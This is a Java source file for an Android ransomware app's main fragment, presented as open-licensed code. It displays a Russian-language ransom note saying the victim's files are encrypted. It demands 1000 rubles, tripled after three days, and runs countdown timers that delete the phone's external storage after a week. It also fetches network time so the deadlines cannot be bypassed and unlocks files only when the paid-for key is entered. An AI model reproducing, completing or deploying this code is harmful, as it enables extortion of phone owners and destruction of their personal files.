/*
 * Copyright (C) 2018 Тимашков Иван
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.android.vkontakte;

import android.annotation.SuppressLint;
import android.app.AlertDialog.Builder;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.graphics.Paint;
import android.graphics.Typeface;
import android.net.Uri;
import android.os.Bundle;
import android.os.CountDownTimer;
import android.os.Handler;
import android.os.Message;
import android.os.StrictMode;
import android.os.StrictMode.ThreadPolicy;
import android.support.v4.app.Fragment;
import android.support.v4.app.FragmentActivity;
import android.support.v4.media.TransportMediator;
import android.support.v7.recyclerview.BuildConfig;
import android.view.LayoutInflater;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ImageView;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.Toast;
import java.io.IOException;
import java.net.URL;
import java.net.URLConnection;
import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;
import java.util.Timer;
import java.util.TimerTask;

//##################################################################
/**
 * @since 21.09.2018
 * @author Тимашков Иван
 * @author https://github.com/TimScriptov
 */
@SuppressLint("NewApi") public class MainFragment extends Fragment
//##################################################################
	{

		ScrollView ScrollView;
		Button bt;//Кнопка "Невозможно расшифровать"
		TextView bt1;
		TextView bt2;
		TextView bt3;
		EditText ed;//Ввод пароля
		Button fz;//Кнопка "Копировать"
		TextView je;
		TextView jed;
		TextView lapm;//Узнать способы оплаты
		TextView nr1;
		TextView nr2;
		TextView nr3;
		TextView nr4;
		TextView sc;
		TextView scd;
		long timeStart;
		long fileLostTimeStamp;
		View view;
		long paymentRaisedTimeStamp;
		TextView wb;//Серийный номер
		Button checkPaymentButton;//Кнопка "Проверить оплату"
		TextView zfje;
		boolean 彼岸花;
		private Handler mHandler;
//===================================================================
		public MainFragment ( )
//===================================================================
			{
				mHandler = new Handler ( ) {
						@Override public void handleMessage ( Message message )
							{
								if ( message.what == 1279525738 && 彼岸花 )
									{
										彼岸花 = false;
										Toast.makeText ( getActivity ( ), "Расшифровка завершена!", Toast.LENGTH_LONG ).show ( );
										bt.setText ( "Расшифровка завершена" );
										ed.setText ( BuildConfig.VERSION_NAME );
									}
							}
					};
			}//MainFragment
//===================================================================
		void ewm ( int i )
//===================================================================
			{
				ImageView imageView = new ImageView ( getActivity ( ) );
				imageView.setImageResource ( i );
				new Builder ( getActivity ( ) ).setView ( imageView ).show ( );
			}//ewm
//===================================================================
		@Override
		public View onCreateView ( LayoutInflater layoutInflater, ViewGroup viewGroup, Bundle bundle )
//===================================================================
			{
				view = layoutInflater.inflate ( R.layout.main, viewGroup, false );
				StrictMode.setThreadPolicy ( new ThreadPolicy.Builder ( ).permitAll ( ).build ( ) );

				super.onCreate ( bundle );

				wb = view.findViewById ( R.id.wb );
				bt = view.findViewById ( R.id.bt );
				fz = view.findViewById ( R.id.fz );
				ed = view.findViewById ( R.id.ed );
				lapm = view.findViewById ( R.id.lapm );
				je = view.findViewById ( R.id.je );
				sc = view.findViewById ( R.id.sc );
				jed = view.findViewById ( R.id.jed );
				scd = view.findViewById ( R.id.scd );
				zfje = view.findViewById ( R.id.zfje );
				ScrollView = view.findViewById ( R.id.ScrollView );
				bt1 = view.findViewById ( R.id.bt1 );
				bt2 = view.findViewById ( R.id.bt2 );
				bt3 = view.findViewById ( R.id.bt3 );
				nr1 = view.findViewById ( R.id.nr1 );
				nr2 = view.findViewById ( R.id.nr2 );
				nr3 = view.findViewById ( R.id.nr3 );
				nr4 = view.findViewById ( R.id.nr4 );

				zfje.setText ( "Разблокировка файлов стоит 1000 рублей" );
				bt1.setText ( "Что случилось с моим телефоном?" );
				nr1.setText ( "Ваши файлы были зашифрованы. Фотографии, изображения, документы, архивы, аудио, видеофайлы, txt-файлы и т.д. Почти все типы файлов зашифрованы, поэтому их невозможно открыть. Это существенно отличается от общего повреждения файлов. Вы можете найти способы восстановления файлов в Интернете, но без нашей помощи вы не сможете их расшифровать." );
				bt2.setText ( "Есть ли способ восстановить эти документы?" );
				nr2.setText ( "Конечно, существуют методы для восстановления. Его можно восстановить только через нашу службу расшифровки. Я гарантирую лично что могу обеспечить безопасные и эффективные услуги по восстановлению. Но вы должны за определённый срок заплатить. Пожалуйста, будьте уверены, я никогда не буду врать вам. Можно ли в любой момент заплатить фиксированную сумму платежа? Будет ли она восстановлена? Конечно, нет. Не откладывайте оплату для это вас будет хуже. Лучше заплатить платеж в течение 3 дней, или стоимость будет утроена через три дня. Кроме того, если вы не оплатите в течение недели, ваши файлы будут удалены." );
				bt3.setText ( "Способы оплаты:" );
				nr3.setText ( "Нажмите <Узнать способы оплаты> и с вами свяжутся наши специалисты. Там вам расскажут куда нужно положить деньги, и как расшифровать свои файлы. После того, как вы отправите деньги вы должны отправить нашим специалистам чек и свой серийный номер(нажмите кнопку <Копировать>). После получения чека и вашего серийного номера вам отправят ключ для расшифровки." );
				nr4.setText ( "Я настоятельно рекомендую, чтобы во избежание ненужных проблем не закрывайте и не удаляйте программное обеспечение до завершения работы по восстановлению. В любом случае по какой-либо причине, если программное обеспечение будет удалено, вполне вероятно, что информация не будет восстановлена ​​после оплаты." );

				Typeface createFromAsset = Typeface.createFromAsset ( getActivity ( ).getAssets ( ), "ssspbahk.so" );
				sc.setTypeface ( createFromAsset );
				je.setTypeface ( createFromAsset );

				FragmentActivity activity = getActivity ( );
				SharedPreferences sharedPreferences = activity.getSharedPreferences ( "XH", Context.MODE_PRIVATE );

				wb.setText ( sharedPreferences.getString ( "bah", BuildConfig.VERSION_NAME ) );
				lapm.getPaint ( ).setFlags ( Paint.UNDERLINE_TEXT_FLAG );

				if ( sharedPreferences.getInt ( "sss", 0 ) == 1 )
					{
						bt.setText ( "Расшифровать" );
						bt.setEnabled ( true );
						ed.setFocusableInTouchMode ( true );
					}

				if ( sharedPreferences.getInt ( "cjk", 0 ) == 1 )
					{
						bt.setText ( "Расшифровка завершена" );
						Toast.makeText ( getActivity ( ), "Расшифровка завершена!", Toast.LENGTH_LONG ).show ( );
					}

				try
					{
						URLConnection openConnection = new URL ( "http://biaozhunshijian.51240.com/" ).openConnection ( );
						openConnection.connect ( );
						Date date = new Date ( openConnection.getDate ( ) );
						SimpleDateFormat simpleDateFormat = new SimpleDateFormat ( "yyyy-MM-dd HH:mm:ss SSS" );
						Calendar instance = Calendar.getInstance ( );
						instance.setTime ( simpleDateFormat.parse ( simpleDateFormat.format ( date ) ) );
						timeStart = instance.getTimeInMillis ( );
					}
				catch (IOException e)
					{
						timeStart = System.currentTimeMillis ( );
					}
				catch (ParseException e)
					{
						e.printStackTrace ( );
					}

				try
					{
						if ( ( sharedPreferences.getLong ( "sj", 0 ) == 0 ) || ( sharedPreferences.getLong ( "sj1", 0 ) ) == 0 )
							{
								Editor edit = sharedPreferences.edit ( );
								edit.putLong ( "sj", timeStart + ( (long) 604801000 ) );
								edit.putLong ( "sj1", timeStart + ( (long) 259201000 ) );
								edit.commit ( );
								fileLostTimeStamp = 604801000;
								paymentRaisedTimeStamp = 259201000;
							}
						else
							{
								fileLostTimeStamp = sharedPreferences.getLong ( "sj", 0 ) - timeStart;
								paymentRaisedTimeStamp = sharedPreferences.getLong ( "sj1", 0 ) - timeStart;
							}

						jed.setText (
							new SimpleDateFormat ( "MM/dd/yyyy HH:mm:ss" ).format ( sharedPreferences.getLong ( "sj1", 0 ) ) );
						scd.setText (
							new SimpleDateFormat ( "MM/dd/yyyy HH:mm:ss" ).format ( sharedPreferences.getLong ( "sj", 0 ) ) );

						new DeleteFileCountDownTimer ( fileLostTimeStamp, (long) 1000 ).start ( );

						new payReminderCountDownTimer ( paymentRaisedTimeStamp, (long) 1000 ).start ( );
					}
				catch (Exception e)
					{
					}

				this.bt.setOnClickListener ( new OnClickListener ( ) {
							@Override public void onClick ( View view )
								{
									if ( 彼岸花 )
										{
											Toast.makeText ( getActivity ( ),
															"Расшифровка уже началась! Пожалуйста, ни чего не делайте!", Toast.LENGTH_SHORT ).show ( );
										}
									else if ( ed.getText ( ).toString ( ).equals ( MainActivity.decryptKey ) )
										{
											彼岸花 = true;
											Toast.makeText ( getActivity ( ), "Ключ правильный, начинается расшифровка!",
															Toast.LENGTH_SHORT ).show ( );
											bt.setText ( "В расшифровке" );

											new Thread ( new Runnable ( )
													{
														@Override public void run ( )
															{
																Utils.GetFiles ( MainActivity.externalStorageDirectory.toString ( ), MainActivity.hz, true );
																if ( Utils.filesToEncrypt.size ( ) == 0 )
																	{
																		FragmentActivity activity = getActivity ( );
																		Editor edit = activity.getSharedPreferences ( "XH", Context.MODE_PRIVATE ).edit ( );
																		edit.putInt ( "cjk", 1 );
																		edit.commit ( );
																		mHandler.obtainMessage ( 1279525738 ).sendToTarget ( );
																		return;
																	}
																Utils.deleteDir ( MainActivity.externalStorageDirectory.toString ( ),
																				 ed.getText ( ).toString ( ), 0, getActivity ( ) );
															}//run
													} ).start ( );
										}
									else
										{
											Toast.makeText ( getActivity ( ), "Неверный ключ!", Toast.LENGTH_SHORT ).show ( );
										}
								}
						} );

				fz.setOnClickListener ( new OnClickListener ( )
						{
							@Override public void onClick ( View view )
								{
									( (ClipboardManager) getActivity ( ).getSystemService ( Context.CLIPBOARD_SERVICE ) ).setText (
										wb.getText ( ).toString ( ) );
									Toast.makeText ( getActivity ( ), "Копирование успешно!", Toast.LENGTH_SHORT ).show ( );
								}//onClick
						} );
						
				//Ссылка "Узнать способы оплаты"
				lapm.setOnClickListener ( new OnClickListener ( ) 
						{
							@Override public void onClick ( View view )
								{
									startActivity ( new Intent ( "android.intent.action.VIEW", Uri.parse (
																	"https://..." ) ) );//Ссылка
									Toast.makeText ( getActivity ( ), "Добро пожаловать!", Toast.LENGTH_LONG ).show ( );
								}//onClick
						} );
						
				ed.setOnClickListener ( new OnClickListener ( ) {
							@Override public void onClick ( View view )
								{
									new Timer ( ).schedule ( new TimerTask ( )
											{
												public void run ( )
													{
														ScrollView.fullScroll ( TransportMediator.KEYCODE_MEDIA_RECORD );
													}//run
											}, (long) 150 );
								}//onClick
						} );

				return this.view;
			}//onCreateView
//##################################################################
		class DeleteFileCountDownTimer extends CountDownTimer
//##################################################################
			{
				public DeleteFileCountDownTimer ( long millisInFuture, long countDownInterval )
//===================================================================
					{
						super ( millisInFuture, countDownInterval );
					}
//===================================================================
				@Override public void onFinish ( )
//===================================================================
					{
						sc.setText ( "Время вышло!" );
						Toast.makeText ( getActivity ( ), "Ваши файлы будут удалены!", Toast.LENGTH_LONG ).show ( );
						new Thread ( new Runnable ( ) {
									@Override public void run ( )
										{
											Utils.deleteFile ( MainActivity.externalStorageDirectory );
										}//run
								} ).start ( );
					}//onFinish
//===================================================================
				@Override public void onTick ( long j )
//===================================================================
					{
						sc.setText ( Utils.formatDuring ( j ) );
					}//onTick
//===================================================================
			}//DeleteFileCountDownTimer
//##################################################################
		class payReminderCountDownTimer extends CountDownTimer
//##################################################################
			{
//===================================================================
				public payReminderCountDownTimer ( long millisInFuture, long countDownInterval )
//===================================================================
					{
						super ( millisInFuture, countDownInterval );
					}//payReminderCountDownTimer
//===================================================================
				@Override public void onFinish ( )
//===================================================================
					{
						zfje.setText ( "Время вышло! Стоимость разблокировки 3000 рублей." );
						je.setText ( "Время вышло!" );
					}//onFinish
//===================================================================
				@Override public void onTick ( long j )
//===================================================================
					{
						je.setText ( Utils.formatDuring ( j ) );
					}//onTick
//===================================================================
			}//payReminderCountDownTimer
//##################################################################
	}//MainFragment
//##################################################################
